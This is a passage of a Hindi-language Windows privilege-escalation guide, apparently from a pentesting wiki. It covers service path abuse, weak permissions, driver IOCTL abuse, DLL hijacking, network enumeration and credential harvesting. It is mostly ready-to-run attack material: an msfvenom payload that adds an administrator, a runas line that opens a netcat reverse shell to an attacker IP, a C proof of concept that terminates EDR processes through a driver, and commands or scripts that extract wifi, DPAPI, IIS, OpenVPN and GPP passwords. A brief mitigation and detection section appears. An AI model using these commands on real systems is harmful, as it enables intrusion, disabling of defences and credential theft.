बिल्ट-इन Windows सेवाओं से संबंधित सेवाओं को छोड़कर, सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path`  
आप metasploit के साथ मैन्युअली एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल हो तो कौन‑सी क्रियाएँ की जानी चाहिए। यह फ़ीचर किसी binary की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँच करें **binaries की permissions** (शायद आप उनमें से किसी को overwrite करके privileges escalate कर सकें) और **फ़ोल्डरों** की भी। ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँचें कि आप किसी config file को modify करके किसी special file को पढ़ सकते हैं या क्या आप किसी binary को modify कर सकते हैं जो Administrator account (schedtasks) द्वारा execute किया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएं

**जाँच करें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जिसे किसी अन्य user द्वारा execute किया जाएगा।**\
**पढ़ें** **निम्नलिखित पृष्ठ** ताकि आप दिलचस्प **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर्स

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive प्रदान करता है (अक्सर poorly designed IOCTL handlers में देखा जाता है), तो आप kernel memory से सीधे SYSTEM token चुराकर privilege escalate कर सकते हैं। चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

उन race-condition बग्स के लिए जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने (max-length components या deep directory chains का उपयोग करके) विंडो को microseconds से बढ़ाकर दसियों microseconds तक फैला सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities आपको deterministic layouts तैयार करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को बिना किसी custom driver के kernel paged-pool overflows में बदलने की अनुमति देती हैं। पूरी चेन यहाँ देखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को मजबूत SDDL के साथ IoCreateDeviceSecure से बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय लागू नहीं होता जब device को किसी extra component वाली path के माध्यम से खोला जाता है, जिससे कोई भी unprivileged user निम्न namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device खोल सके, तो driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक मामलों में देखी गई उदाहरण क्षमताएँ:
- arbitrary processes को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- arbitrary processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) भी शामिल हैं, जिससे AV/EDR का user land से kernel के माध्यम से kill संभव होता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए निवारक उपाय
- हमेशा FILE_DEVICE_SECURE_OPEN सेट करें जब आप ऐसे device objects बना रहे हों जिन्हें DACL द्वारा प्रतिबंधित किया जाना है।
- प्रिविलेज्ड ऑपरेशन्स के लिए caller context को सत्यापित करें। process termination या handle returns की अनुमति देने से पहले PP/PPL चेक जोड़ें।
- IOCTLs को सीमित रखें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

रक्षा करने वालों के लिए पहचान के विचार
- संदिग्ध device names (e.g., \\ .\\amsdk*) के user-mode opens की निगरानी करें और दुरुपयोग संकेत देने वाले विशिष्ट IOCTL क्रमों को देखें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) को लागू करें और अपनी allow/deny सूचियाँ बनाए रखें।

## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं तो आप किसी process द्वारा लोड की गई DLL को hijack करके **escalate privileges** कर सकते हैं।

PATH के अंदर सभी फ़ोल्डरों की permissions जांचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जांच का दुरुपयोग कैसे किया जा सकता है, इसके बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहरी से **प्रतिबंधित सेवाओं** की जांच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall नियम

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर सुन सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी पोर्ट पर सुनने के लिए करेंगे, यह GUI के माध्यम से पूछेगा कि क्या `nc` को firewall द्वारा अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को आसानी से root के रूप में शुरू करने के लिए, आप कोशिश कर सकते हैं `--default-user root`

आप `WSL` फ़ाइल सिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault सर्वरों, वेबसाइट्स और अन्य प्रोग्राम्स के लिए user credentials स्टोर करता है जिन्हें **Windows** **स्वचालित रूप से लॉग इन** करवा सकता है। पहली नज़र में ऐसा लग सकता है कि यहाँ उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि स्टोर कर सकते हैं ताकि वे ब्राउज़र्स के माध्यम से स्वतः लॉग इन हो जाएँ। पर ऐसा नहीं है।

Windows Vault उन credentials को स्टोर करता है जिनसे Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका अर्थ है कि कोई भी **Windows application जो किसी resource तक पहुँचने के लिए credentials की ज़रूरत होती है** (server या a website) **can make use of this Credential Manager** & Windows Vault और लगातार उपयोगकर्ता द्वारा username और password दर्ज करने के बजाय दिए गए credentials का उपयोग कर सकता है।

Unless the applications interact with Credential Manager, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए credentials का उपयोग कर पाएँगे। इसलिए, यदि आपका application vault का उपयोग करना चाहता है, तो उसे किसी न किसी तरह से **Credential Manager से communicate करना और उस resource के लिए credentials request करना** चाहिए ताकि वे default storage vault से प्राप्त हो सकें।

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ इस्तेमाल कर सकते हैं। निम्नलिखित उदाहरण एक SMB share के माध्यम से एक रिमोट बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए क्रेडेंशियल के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

The **Data Protection API (DPAPI)** डेटा के सिमेट्रिक एन्क्रिप्शन के लिए एक तरीका प्रदान करता है, जिसे मुख्य रूप से Windows ऑपरेटिंग सिस्टम में असिमेट्रिक प्राइवेट कीज़ के सिमेट्रिक एन्क्रिप्शन के लिए उपयोग किया जाता है। यह एन्क्रिप्शन एंट्रॉपी में महत्वपूर्ण योगदान देने के लिए उपयोगकर्ता या सिस्टम गुप्त (secret) का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन रहस्यों से व्युत्पन्न एक सिमेट्रिक की के माध्यम से कुंजियों को एन्क्रिप्ट करने में सक्षम बनाता है**। सिस्टम एन्क्रिप्शन से संबंधित परिदृश्यों में, यह सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए गए उपयोगकर्ता RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होते हैं, जहाँ `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI की, जो उसी फ़ाइल में उपयोगकर्ता की प्राइवेट कीज़ की सुरक्षा करने वाले master key के साथ सह-स्थित रहती है**, सामान्यतः 64 बाइट्स रैंडम डेटा की होती है। (ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच सीमित है, जिससे CMD में `dir` कमांड के माध्यम से इसकी सामग्री सूचीबद्ध करने से रोका जाता है, हालाँकि इसे PowerShell के जरिए सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त तर्क (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

The **credentials files protected by the master password** आमतौर पर निम्न स्थानों पर पाए जाते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके डिक्रिप्ट कर सकते हैं.\
आप **DPAPI** के कई **masterkeys** को **memory** से `sekurlsa::dpapi` module के साथ निकाल सकते हैं (यदि आप root हैं).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **स्क्रिप्टिंग** और ऑटोमेशन कार्यों के लिए उपयोग किए जाते हैं, ताकि एन्क्रिप्टेड क्रेडेंशियल्स को सुविधाजनक तरीके से स्टोर किया जा सके। ये क्रेडेंशियल्स **DPAPI** द्वारा सुरक्षित किए जाते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जहाँ इन्हें बनाया गया था।

फाइल में मौजूद PS credentials को **डिक्रिप्ट** करने के लिए आप कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP Connections

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
आप उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` module का उपयोग करके **decrypt any .rdg files** कर सकते हैं।\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **save passwords** और अन्य जानकारी स्टोर करने के लिए करते हैं, यह समझे बिना कि यह एक डेटाबेस फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित होती है और इसे हमेशा खोजने व जांचने के लायक माना जाना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टालर **SYSTEM privileges के साथ चलते हैं**, कई **DLL Sideloading (जानकारी:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**) के प्रति प्रवण हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys रजिस्ट्री key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर हो सकते हैं, इसलिए आपको चेक करना चाहिए कि वहाँ कुछ रोचक है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के अंदर कोई एंट्री मिलती है तो वह सम्भवत: एक सहेजा गया SSH key होगा। यह encrypted रूप में संग्रहीत होता है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके decrypted किया जा सकता है.\
More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं रही। मैंने कुछ ssh keys बनाने की कोशिश की, उन्हें `ssh-add` से जोड़ा और ssh द्वारा एक मशीन में लॉगिन किया। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना निगरानी वाली फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM और SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल जिसका नाम **SiteList.xml** है खोजें

### Cached GPP पासवर्ड

एक फीचर पहले उपलब्ध था जिससे Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर custom local administrator accounts तैनात किए जा सकते थे। हालांकि, इस तरीके में महत्वपूर्ण सुरक्षा कमियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरा, इन GPPs के भीतर के पासवर्ड, जो कि AES256 से सार्वजनिक रूप से दस्तावेजीकृत default key का उपयोग करके एन्क्रिप्ट किए गए थे, किसी भी authenticated user द्वारा डीक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम पैदा करता था, क्योंकि यह उपयोगकर्ताओं को elevated privileges प्राप्त करने की अनुमति दे सकता था।

इस जोखिम को कम करने के लिए, एक function विकसित किया गया था जो locally cached GPP फ़ाइलों को स्कैन करता है जिनमें एक "cpassword" फ़ील्ड खाली नहीं होती। ऐसी फ़ाइल मिलने पर, यह function पासवर्ड को डीक्रिप्ट करता है और एक custom PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जिससे इस सुरक्षा vulnerability की पहचान और remediation में मदद मिलती है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

